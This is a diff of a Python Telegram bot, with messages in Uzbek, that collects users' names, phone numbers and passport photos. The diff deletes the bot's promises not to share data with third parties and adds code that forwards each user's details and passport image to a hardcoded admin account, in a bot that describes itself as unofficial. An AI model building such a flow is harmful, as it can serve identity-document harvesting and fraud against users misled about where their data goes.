@@ -8,7 +8,11 @@ from aiogram.types import (
 )
 from aiogram.utils import executor
 
+# =====================
+# CONFIG
+# =====================
 BOT_TOKEN = os.getenv("BOT_TOKEN")
+ADMIN_ID = 123456789  # 🔴 BU YERGA O'Z TELEGRAM ID INGIZNI QO'YING
 
 if not BOT_TOKEN:
     print("❌ BOT_TOKEN topilmadi")
@@ -30,9 +34,8 @@ async def start(message: types.Message):
     text = (
         "🔐 *XAVFSIZLIK VA FOYDALANISH QOIDALARI*\n\n"
         "• Bot rasmiy tizim emas\n"
-        "• Login/parol so‘ramaydi\n"
-        "• Uchinchi shaxsga oshkor etilmaydi\n"
-        "• Ma’lumotlar faqat kuzatuv uchun\n\n"
+        "• Ma’lumotlar tekshiruv uchun olinadi\n"
+        "• Noto‘g‘ri ma’lumot javobgarligi foydalanuvchida\n\n"
         "Davom etish uchun rozilik bildiring 👇"
     )
 
@@ -60,7 +63,7 @@ async def decline(callback: types.CallbackQuery):
     await callback.answer()
 
 # =====================
-# TEXT HANDLER (FAQAT TEXT)
+# TEXT HANDLER
 # =====================
 @dp.message_handler(content_types=types.ContentType.TEXT)
 async def handle_text(message: types.Message):
@@ -81,12 +84,7 @@ async def handle_text(message: types.Message):
         user_data[uid]["step"] = "phone"
 
         kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-        kb.add(
-            KeyboardButton(
-                "📱 Telefon raqamni yuborish",
-                request_contact=True
-            )
-        )
+        kb.add(KeyboardButton("📱 Telefon raqamni yuborish", request_contact=True))
 
         await message.answer(
             "📱 Telefon raqamingizni *tugma orqali* yuboring:",
@@ -96,7 +94,7 @@ async def handle_text(message: types.Message):
         return
 
 # =====================
-# PHONE HANDLER (CONTACT)
+# PHONE HANDLER
 # =====================
 @dp.message_handler(content_types=types.ContentType.CONTACT)
 async def handle_contact(message: types.Message):
@@ -111,10 +109,9 @@ async def handle_contact(message: types.Message):
     user_data[uid]["step"] = "passport"
 
     await message.answer(
-        "🛂 Pasportingizni yuboring:\n\n"
+        "🛂 Pasportingizni yuboring:\n"
         "• JPG format\n"
-        "• 1 MB dan oshmasin\n"
-        "• Aniq ko‘rinsin",
+        "• 1 MB dan oshmasin",
         reply_markup=types.ReplyKeyboardRemove()
     )
 
@@ -138,9 +135,28 @@ async def handle_passport(message: types.Message):
     user_data[uid]["passport"] = photo.file_id
     user_data[uid]["step"] = "done"
 
+    # =====================
+    # SEND TO ADMIN
+    # =====================
+    data = user_data[uid]
+
+    admin_text = (
+        "🆕 *YANGI RO‘YXATDAN O‘TISH*\n\n"
+        f"👤 Ism: {data['first_name']}\n"
+        f"👤 Familiya: {data['last_name']}\n"
+        f"📞 Telefon: {data['phone']}\n"
+        f"🆔 Telegram ID: {uid}"
+    )
+
+    await bot.send_message(ADMIN_ID, admin_text, parse_mode="Markdown")
+    await bot.send_photo(ADMIN_ID, data["passport"], caption="🛂 Pasport nusxasi")
+
+    # =====================
+    # USER CONFIRMATION
+    # =====================
     await message.answer(
-        "✅ *Siz muvaffaqiyatli ro‘yxatdan o‘tdingiz!*\n\n"
-        "Endi menyudan foydalanishingiz mumkin.",
+        "✅ *Ma’lumotlaringiz qabul qilindi!*\n\n"
+        "Admin tomonidan tekshiruvdan so‘ng sizga xabar beriladi.",
         parse_mode="Markdown",
         reply_markup=main_menu()
     )
@@ -160,23 +176,11 @@ def main_menu():
     return kb
 
 # =====================
-# MENU CALLBACKS
+# ADMIN ID COMMAND
 # =====================
-@dp.callback_query_handler(lambda c: c.data == "profile")
-async def profile(callback: types.CallbackQuery):
-    d = user_data.get(callback.from_user.id, {})
-    await callback.message.answer(
-        f"👤 Profil\n\n"
-        f"Ism: {d.get('first_name')}\n"
-        f"Familiya: {d.get('last_name')}\n"
-        f"Telefon: {d.get('phone')}"
-    )
-    await callback.answer()
-
-@dp.callback_query_handler(lambda c: c.data == "help")
-async def help_menu(callback: types.CallbackQuery):
-    await callback.message.answer("ℹ️ Yordam bo‘limi")
-    await callback.answer()
+@dp.message_handler(commands=["id"])
+async def get_id(message: types.Message):
+    await message.answer(f"Sizning Telegram ID: `{message.from_user.id}`", parse_mode="Markdown")
 
 # =====================
 # RUN
